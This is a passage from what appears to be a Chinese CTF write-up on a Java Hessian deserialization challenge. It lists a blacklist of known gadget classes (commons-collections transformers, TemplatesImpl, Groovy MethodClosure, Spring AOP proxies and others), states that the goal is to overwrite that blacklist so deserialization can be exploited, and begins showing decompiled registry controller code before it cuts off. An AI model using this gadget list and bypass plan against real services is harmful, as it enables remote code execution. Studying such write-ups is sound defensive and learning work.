</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>collections4</span><span class=p>.</span><span class=na>functors</span><span class=p>.</span><span class=na>ConstantTransformer</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>collections4</span><span class=p>.</span><span class=na>functors</span><span class=p>.</span><span class=na>InstantiateTransformer</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>collections4</span><span class=p>.</span><span class=na>functors</span><span class=p>.</span><span class=na>InvokerTransformer</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>dbcp</span><span class=p>.</span><span class=na>datasources</span><span class=p>.</span><span class=na>PerUserPoolDataSource</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>dbcp</span><span class=p>.</span><span class=na>datasources</span><span class=p>.</span><span class=na>SharedPoolDataSource</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>dbcp2</span><span class=p>.</span><span class=na>datasources</span><span class=p>.</span><span class=na>PerUserPoolDataSource</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>fileupload</span><span class=p>.</span><span class=na>disk</span><span class=p>.</span><span class=na>DiskFileItem</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>myfaces</span><span class=p>.</span><span class=na>context</span><span class=p>.</span><span class=na>servlet</span><span class=p>.</span><span class=na>FacesContextImpl</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>myfaces</span><span class=p>.</span><span class=na>context</span><span class=p>.</span><span class=na>servlet</span><span class=p>.</span><span class=na>FacesContextImplBase</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>myfaces</span><span class=p>.</span><span class=na>el</span><span class=p>.</span><span class=na>CompositeELResolver</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>myfaces</span><span class=p>.</span><span class=na>el</span><span class=p>.</span><span class=na>unified</span><span class=p>.</span><span class=na>FacesELContext</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>myfaces</span><span class=p>.</span><span class=na>view</span><span class=p>.</span><span class=na>facelets</span><span class=p>.</span><span class=na>el</span><span class=p>.</span><span class=na>ValueExpressionMethodExpression</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>tomcat</span><span class=p>.</span><span class=na>dbcp</span><span class=p>.</span><span class=na>dbcp</span><span class=p>.</span><span class=na>datasources</span><span class=p>.</span><span class=na>PerUserPoolDataSource</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>tomcat</span><span class=p>.</span><span class=na>dbcp</span><span class=p>.</span><span class=na>dbcp</span><span class=p>.</span><span class=na>datasources</span><span class=p>.</span><span class=na>SharedPoolDataSource</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>tomcat</span><span class=p>.</span><span class=na>dbcp</span><span class=p>.</span><span class=na>dbcp2</span><span class=p>.</span><span class=na>datasources</span><span class=p>.</span><span class=na>PerUserPoolDataSource</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>wicket</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>upload</span><span class=p>.</span><span class=na>DiskFileItem</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>xalan</span><span class=p>.</span><span class=na>xsltc</span><span class=p>.</span><span class=na>trax</span><span class=p>.</span><span class=na>TemplatesImpl</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>xbean</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>context</span><span class=p>.</span><span class=na>ContextUtil$ReadOnlyBinding</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>codehaus</span><span class=p>.</span><span class=na>groovy</span><span class=p>.</span><span class=na>runtime</span><span class=p>.</span><span class=na>ConvertedClosure</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>codehaus</span><span class=p>.</span><span class=na>groovy</span><span class=p>.</span><span class=na>runtime</span><span class=p>.</span><span class=na>MethodClosure</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>hibernate</span><span class=p>.</span><span class=na>engine</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>TypedValue</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>hibernate</span><span class=p>.</span><span class=na>tuple</span><span class=p>.</span><span class=na>component</span><span class=p>.</span><span class=na>AbstractComponentTuplizer</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>hibernate</span><span class=p>.</span><span class=na>tuple</span><span class=p>.</span><span class=na>component</span><span class=p>.</span><span class=na>PojoComponentTuplizer</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>hibernate</span><span class=p>.</span><span class=na>type</span><span class=p>.</span><span class=na>AbstractType</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>hibernate</span><span class=p>.</span><span class=na>type</span><span class=p>.</span><span class=na>ComponentType</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>hibernate</span><span class=p>.</span><span class=na>type</span><span class=p>.</span><span class=na>Type</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>builder</span><span class=p>.</span><span class=na>InterceptionModelBuilder</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>builder</span><span class=p>.</span><span class=na>MethodReference</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>proxy</span><span class=p>.</span><span class=na>DefaultInvocationContextFactory</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>proxy</span><span class=p>.</span><span class=na>InterceptorMethodHandler</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>reader</span><span class=p>.</span><span class=na>ClassMetadataInterceptorReference</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>reader</span><span class=p>.</span><span class=na>DefaultMethodMetadata</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>reader</span><span class=p>.</span><span class=na>ReflectiveClassMetadata</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>reader</span><span class=p>.</span><span class=na>SimpleInterceptorMetadata</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>instance</span><span class=p>.</span><span class=na>InterceptorInstantiator</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>metadata</span><span class=p>.</span><span class=na>InterceptorReference</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>metadata</span><span class=p>.</span><span class=na>MethodMetadata</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>model</span><span class=p>.</span><span class=na>InterceptionModel</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>model</span><span class=p>.</span><span class=na>InterceptionType</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>weld</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>builder</span><span class=p>.</span><span class=na>InterceptionModelBuilder</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>weld</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>builder</span><span class=p>.</span><span class=na>MethodReference</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>weld</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>proxy</span><span class=p>.</span><span class=na>DefaultInvocationContextFactory</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>weld</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>proxy</span><span class=p>.</span><span class=na>InterceptorMethodHandler</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>weld</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>reader</span><span class=p>.</span><span class=na>ClassMetadataInterceptorReference</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>weld</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>reader</span><span class=p>.</span><span class=na>DefaultMethodMetadata</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>weld</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>reader</span><span class=p>.</span><span class=na>ReflectiveClassMetadata</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>weld</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>reader</span><span class=p>.</span><span class=na>SimpleInterceptorMetadata</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>weld</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>instance</span><span class=p>.</span><span class=na>InterceptorInstantiator</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>weld</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>metadata</span><span class=p>.</span><span class=na>InterceptorReference</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>weld</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>metadata</span><span class=p>.</span><span class=na>MethodMetadata</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>weld</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>model</span><span class=p>.</span><span class=na>InterceptionModel</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>weld</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>model</span><span class=p>.</span><span class=na>InterceptionType</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>mozilla</span><span class=p>.</span><span class=na>javascript</span><span class=p>.</span><span class=na>Context</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>mozilla</span><span class=p>.</span><span class=na>javascript</span><span class=p>.</span><span class=na>IdScriptableObject</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>mozilla</span><span class=p>.</span><span class=na>javascript</span><span class=p>.</span><span class=na>MemberBox</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>mozilla</span><span class=p>.</span><span class=na>javascript</span><span class=p>.</span><span class=na>NativeError</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>mozilla</span><span class=p>.</span><span class=na>javascript</span><span class=p>.</span><span class=na>NativeJavaMethod</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>mozilla</span><span class=p>.</span><span class=na>javascript</span><span class=p>.</span><span class=na>NativeJavaObject</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>mozilla</span><span class=p>.</span><span class=na>javascript</span><span class=p>.</span><span class=na>NativeObject</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>mozilla</span><span class=p>.</span><span class=na>javascript</span><span class=p>.</span><span class=na>ScriptableObject</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>python</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>PyBytecode</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>python</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>PyFunction</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>python</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>PyObject</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>reflections</span><span class=p>.</span><span class=na>Reflections</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>aop</span><span class=p>.</span><span class=na>aspectj</span><span class=p>.</span><span class=na>autoproxy</span><span class=p>.</span><span class=na>AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>aop</span><span class=p>.</span><span class=na>framework</span><span class=p>.</span><span class=na>AdvisedSupport</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>aop</span><span class=p>.</span><span class=na>framework</span><span class=p>.</span><span class=na>JdkDynamicAopProxy</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>aop</span><span class=p>.</span><span class=na>support</span><span class=p>.</span><span class=na>DefaultBeanFactoryPointcutAdvisor</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>aop</span><span class=p>.</span><span class=na>target</span><span class=p>.</span><span class=na>SingletonTargetSource</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>beans</span><span class=p>.</span><span class=na>factory</span><span class=p>.</span><span class=na>ObjectFactory</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>beans</span><span class=p>.</span><span class=na>factory</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>PropertyPathFactoryBean</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>beans</span><span class=p>.</span><span class=na>factory</span><span class=p>.</span><span class=na>support</span><span class=p>.</span><span class=na>DefaultListableBeanFactory</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>SerializableTypeWrapper$MethodInvokeTypeProvider</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>SerializableTypeWrapper$TypeProvider</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>jndi</span><span class=p>.</span><span class=na>support</span><span class=p>.</span><span class=na>SimpleJndiBeanFactory</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>transaction</span><span class=p>.</span><span class=na>jta</span><span class=p>.</span><span class=na>JtaTransactionManager</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sun</span><span class=p>.</span><span class=na>rmi</span><span class=p>.</span><span class=na>server</span><span class=p>.</span><span class=na>UnicastRef</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sun</span><span class=p>.</span><span class=na>rmi</span><span class=p>.</span><span class=na>server</span><span class=p>.</span><span class=na>UnicastRef2</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>com</span><span class=p>.</span><span class=na>mysql</span><span class=p>.</span><span class=na>jdbc</span><span class=p>.</span><span class=na>jdbc2</span><span class=p>.</span><span class=na>optional</span><span class=p>.</span><span class=na>MysqlDataSource</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>jboss</span><span class=p>.</span><span class=na>proxy</span><span class=p>.</span><span class=na>ejb</span><span class=p>.</span><span class=na>handle</span><span class=p>.</span><span class=na>HomeHandleImpl</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>所以就是如何覆盖黑名单为空或者任意类，就可以打反序列化了，接着看 registry</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.example.registry.controller</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.alibaba.fastjson2.JSON</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.example.registry.data.Blacklist</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.example.registry.data.Result</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.example.registry.util.DefaultSerializer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.example.registry.util.HessianSerializer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.example.registry.util.Request</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>io.swagger.v3.oas.annotations.Operation</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>io.swagger.v3.oas.annotations.tags.Tag</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Base64</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.bind.annotation.GetMapping</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.bind.annotation.PostMapping</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.bind.annotation.RestController</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nd>@Tag</span><span class=p>(</span><span class=n>name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;Registry Controller&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nd>@RestController</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/* loaded from: registry-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/registry/controller/MainController.class */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>MainController</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@GetMapping</span><span class=p>({</span><span class=s>&#34;/&#34;</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Operation</span><span class=p>(</span><span class=n>description</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;hello for all&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>hello</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=s>&#34;hello&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@GetMapping</span><span class=p>({</span><span class=s>&#34;/client/status&#34;</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Operation</span><span class=p>(</span><span class=n>description</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;registry will request client &#39;/status&#39; to get client status.&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Result</span><span class=w> </span><span class=nf>clientStatus</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>json</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Request</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=s>&#34;http://server:8080/status&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=n>Result</span><span class=p>)</span><span class=w> </span><span class=n>JSON</span><span class=p>.</span><span class=na>parseObject</span><span class=p>(</span><span class=n>json</span><span class=p>,</span><span class=w> </span><span class=n>Result</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>Result</span><span class=p>.</span><span class=na>of</span><span class=p>(</span><span class=s>&#34;500&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;client is down&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@GetMapping</span><span class=p>({</span><span class=s>&#34;/blacklist/jdk/get&#34;</span><span class=p>})</span><span class=w>
